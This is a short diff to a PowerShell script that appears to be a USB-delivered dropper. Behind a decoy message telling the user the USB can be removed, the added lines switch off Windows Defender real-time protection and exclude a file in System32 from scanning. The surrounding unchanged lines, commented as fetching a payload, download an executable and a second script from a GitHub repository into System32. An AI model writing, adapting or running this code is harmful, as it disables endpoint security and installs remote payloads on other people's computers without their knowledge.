@@ -1,4 +1,8 @@
 echo "-------you can safely remove USB--------"
+# disable rtp
+Set-MpPreference -DisableRealtimeMonitoring $true
+# add exclusion to self
+Add-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1.exe"
 # fetch payload from github
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
